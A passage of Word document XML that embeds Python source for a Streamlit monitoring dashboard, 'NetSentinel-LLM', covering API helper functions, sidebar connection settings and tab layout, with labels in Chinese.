      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BA0FB27">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>RISK_TEXT = {"info": "提示", "low": "低", "medium": "中", "high": "高", "critical": "严重"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="623CB5C5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>INK_MUTED = "#898781"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51124742">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>GRID = "#e1e0d9"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BEFBE38">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56D14AA3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="461290E1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>st.set_page_config(page_title="NetSentinel-LLM 看板", layout="wide")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15BBE407">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="42256250">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0AF6D7EA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># ------------------------------------------------------------------ 取数</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35E3960A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61A54BC6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D127879">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def api(path: str, **params):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C1B381D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    url = CENTER.rstrip("/") + path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66FCB71F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54B51A81">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        resp = httpx.get(url, params=params, headers={"X-Probe-Token": TOKEN}, timeout=10,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F7013E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                         trust_env=not is_local_endpoint(CENTER))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="364B54B1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    except httpx.HTTPError as exc:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="711D2840">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return None, f"连不上中心服务 {url}：{exc}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A242F44">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if resp.status_code != 200:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AF6805C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        detail = resp.json().get("detail", resp.text) if resp.content else resp.text</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E1C9CF4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return None, f"中心端返回 {resp.status_code}：{detail}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24A0C2A2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return resp.json(), None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F7191CE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="546F9E99">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4485835C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def api_post(path: str, body: dict):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0881BF3C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    url = CENTER.rstrip("/") + path</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="262A79DD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    try:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09414913">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        resp = httpx.post(url, json=body, headers={"X-Probe-Token": TOKEN}, timeout=60,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DA02C92">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                          trust_env=not is_local_endpoint(CENTER))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3927C5E7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    except httpx.HTTPError as exc:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BDF9361">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return None, f"连不上中心服务 {url}：{exc}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B92EED2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    if resp.status_code != 200:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FA4F2BD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        detail = resp.json().get("detail", resp.text) if resp.content else resp.text</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B8242F8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        return None, f"中心端返回 {resp.status_code}：{detail}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42EA5DEF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return resp.json(), None</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58D67B41">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="670F33B0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3721C187">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># ------------------------------------------------------------------ 侧栏</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19BF31D1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="742C9B72">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>with st.sidebar:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B04D491">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    st.header("连接")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EB0C372">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    CENTER = st.text_input("中心服务地址", value=os.environ.get("NETSENTINEL_CENTER", "http://127.0.0.1:8000"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4605F3DF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    TOKEN = st.text_input(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B80867B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "探针 Token", type="password", value=os.environ.get("NETSENTINEL_TOKEN", "")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="345299F6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    )</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D9466CB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    window = st.selectbox("统计时间范围", ["最近 10 分钟", "最近 1 小时", "最近 6 小时", "最近 24 小时"], index=1)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49A988D5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    minutes = {"最近 10 分钟": 10, "最近 1 小时": 60, "最近 6 小时": 360, "最近 24 小时": 1440}[window]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5260CC26">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    live = st.toggle("自动刷新（2 秒）", value=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B4EE376">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    st.caption("抓包需要 root；探针 token 与 config.yaml 的 center.token 一致。")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36A0565C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2D7E167C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>if not TOKEN:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC14EB6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    st.warning("请先在侧栏填 Token（或设置环境变量 NETSENTINEL_TOKEN）")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00880817">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    st.stop()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="072D3FEB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5BE96A0A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="74105367">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def money_fmt(n: int) -&gt; str:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CB12DE7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return f"{n:,}"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="683A820C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="050A52D8">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D9ADC5B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t># ------------------------------------------------------------------ 顶部指标</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="385C8278">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2F6C6747">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>tab_live, tab_alerts, tab_report, tab_history = st.tabs(["实时总览", "告警", "诊断报告", "历史查询"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25C469F1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66DDEE97">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="489BBCB2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
